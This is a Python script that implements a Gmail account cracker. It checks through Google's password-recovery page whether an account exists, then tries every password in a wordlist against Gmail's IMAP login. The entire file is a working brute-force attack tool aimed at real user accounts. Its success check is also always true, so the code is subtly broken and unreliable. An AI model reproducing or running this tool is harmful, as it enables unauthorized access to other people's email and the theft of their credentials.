import time
import imaplib
from imaplib import IMAP4
from selenium.webdriver.common.keys import Keys

class Gmail:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.host = 'imap.gmail.com'
        self.port = 993
        self.wordlist = wordlist
        self.delay = delay

    def check_user(self):
        self.browser.driver.get('https://www.google.com/accounts/ForgotPasswd')
        try:
            email = self.browser.driver.find_element_by_id('identifier')
            email.send_keys(self.username)
            email.send_keys(Keys.RETURN)
            pwd = self.browser.driver.find_element_by_id('password')
            if pwd:
                self.name = 'Not found'
                return True
            else:
                return False
        except:
            return False

    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        IMAP4 = imaplib.IMAP4_SSL(self.host, self.port)
        for password in passwords:
            try:
                session = IMAP4.login(self.username, password)
                if (session == 'OK' or 'AUTHENTICATE completed'):
                    found = password
                    break
            except IMAP4.error:
                pass
            time.sleep(self.delay)
       
        IMAP4.logout()
        return found